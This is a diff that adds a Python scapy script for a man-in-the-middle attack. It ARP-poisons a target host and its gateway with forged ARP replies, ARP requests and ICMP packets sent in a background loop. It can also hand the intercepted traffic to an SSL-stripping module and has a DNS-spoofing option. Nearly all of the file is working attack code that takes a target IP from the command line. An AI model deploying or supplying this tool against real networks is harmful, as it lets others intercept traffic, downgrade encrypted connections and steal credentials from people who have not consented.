@@ -1,0 +1,188 @@
+from scapy.all import *
+load_layer("http") 
+load_layer("dns") 
+
+import time
+import argparse
+import packet_sniffer
+import ssl_strip
+
+import threading
+lock = threading.Lock()
+
+ARP_STORM_DELAY = 10          # milliseconds
+ARP_POISON_SMART = 0          # boolean
+ARP_POISON_WARM_UP = 1        # seconds
+ARP_POISON_DELAY = 10         # seconds
+ARP_POISON_ICMP = 1           # boolean
+ARP_POISON_REPLY = 1          # boolean
+ARP_POISON_REQUEST = 0        # boolean
+ARP_POISON_EQUAL_MAC = 1      # boolean
+DHCP_LEASE_TIME = 1800        # seconds
+PORT_STEAL_DELAY = 10         # seconds
+PORT_STEAL_SEND_DELAY = 2000  # microseconds
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
+    parser.add_argument("-i", "--iface", dest="iface", default="enp0s3", help="Interface [default: %(default)]")
+
+    parser.add_argument("-d", "--dns-spoof", dest="dns-spoof", default=False, help="dns-spoof [default: %(default)]")
+    parser.add_argument("-s", "--ssl-strip", dest="ssl_strip", default=False, help="ssl-strip [default: %(default)]")
+
+    parser.add_argument("-v", "--verbose", dest="verbose", default=False, help="if verbosity is enabled [default: %(default)]")
+    options = parser.parse_args()
+    return options
+
+options = get_arguments()
+
+poison_thread = 0
+poison_confirm_thread = 0
+read_packets_thread = 0
+
+
+
+# arp = Ether() / ARP()
+# arp[Ether].src = ATTACKER_MAC
+# arp[ARP].hwsrc = ATTACKER_MAC
+# arp[ARP].psrc = ipToSpoof
+# arp[ARP].hwdst = macVictim
+# arp[ARP].pdst = ipVictim
+
+# sendp(arp, iface=options.iface)
+
+
+
+def get_mac(ip):
+    arp_request_broadcast = build_ether("ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # Broadcast MAC address: ff:ff:ff:ff:ff:ff
+    # Get list with answered hosts
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=options.iface)[0]
+    return answered_list[0][1].hwsrc if len(answered_list) > 0 else 0
+
+def build_ether(mac):
+    ether = Ether()
+    ether.src = mac
+    return ether
+
+def build_icmp_echo():
+    icmp = ICMP()
+    return icmp
+
+def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
+    arp = ARP()
+    arp.hwsrc = attacker_mac
+    arp.psrc = victim_dst_ip
+    arp.hwdst = victim_src_mac
+    arp.pdst = victim_src_ip
+    arp.op = mode # 1 for request, 2 for reply
+    return arp
+
+def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
+    # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
+    ping = Ether(src=ATTACKER_MAC, dst=victim_dst_mac)/IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
+    return ping
+
+
+def forge_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
+    # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
+    arp = build_ether(attacker_mac)/build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode)
+    return arp
+
+def arp_poison(victims1, victims2):
+ while True:
+    try:
+        print("[*] Sending ARP poison packets...") if options.verbose else 0
+        
+        for victimAdr in victims1:
+            for spoofAdr in victims2:
+                if(victimAdr == spoofAdr):
+                    print("[*] Skipping same IPs...") if options.verbose else 0
+                    continue
+
+                icmp = forge_l2_ping(spoofAdr.ip, victimAdr.ip, victimAdr.mac)
+                sendp(icmp, iface=options.iface, verbose=options.verbose)
+
+                arp = forge_arp(spoofAdr.ip, victimAdr.ip, victimAdr.mac, ATTACKER_MAC, 2)
+                sendp(arp, iface=options.iface, verbose=options.verbose)
+
+                arp[ARP].op = 1
+                sendp(arp, iface=options.iface, verbose=options.verbose)
+                
+        print("[*] end of ARP storm...")  if options.verbose else 0
+    except Exception as e:
+        print(e, traceback.format_exc())
+        sys.exit(0)
+
+    time.sleep(ARP_POISON_WARM_UP)
+
+def poison_confirm(victims1, victims2):
+    while True:
+        pkt = sniff(filter="icmp", count=1)
+        # print("[*] Received ARP packet:")
+        # pkt.show()
+        # print()
+
+
+
+def main():
+    try:
+        global ATTACKER_IP
+        ATTACKER_IP = get_if_addr(options.iface)
+    except TypeError:
+        print("[!] Error: Interface not found")
+        sys.exit(0)
+    global ATTACKER_MAC
+    ATTACKER_MAC = get_if_hwaddr(options.iface)
+
+    victims1 = []
+    victims2 = []
+    
+    target_mac = get_mac(options.target)
+    gateway_mac = get_mac(options.gateway)
+
+    if(target_mac == 0):
+        print("[!] Target MAC not found")
+        sys.exit(0)
+    if(gateway_mac == 0):
+        print("[!] Gateway MAC not found")
+        sys.exit(0)
+
+    victims2.append(type('obj', (object,), {"mac": gateway_mac, "ip": options.gateway}))
+    victims1.append(type('obj', (object,), {"mac": target_mac, "ip": options.target}))
+    # victims2.append((get_mac(options.target), options.target))
+    # victims2.append((get_mac(options.gateway), options.gateway))
+
+    print("[*] Target IP: " + victims1[0].ip)
+    print("[*] Target MAC: " + victims1[0].mac)
+    print("[*] Gateway IP: " + victims2[0].ip)
+    print("[*] Gateway MAC: " + victims2[0].mac)
+
+    print("[*] Attacker IP: " + ATTACKER_IP)
+    print("[*] Attacker MAC: " + ATTACKER_MAC)
+
+    print("[*] Starting ARP poison thread...")
+    
+
+    #use daemon=True to run in background and stop when application quits
+    poison_thread =  threading.Thread(target=arp_poison, args=(victims1, victims2), daemon=True).start()
+    poison_confirm_thread = threading.Thread(target=poison_confirm, args=(victims1, victims2), daemon=True).start()
+
+    time.sleep(ARP_POISON_WARM_UP)
+
+    if(options.ssl_strip):
+        print("[*] Starting SSL strip thread...")
+        vic = victims1 + victims2
+
+        packet_sniffer.main(ssl_strip.check_packet, vic, ATTACKER_MAC, options)
+
+    # wait for ctrl+c to exit application
+    try: 
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[*] Shutting down...")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()    
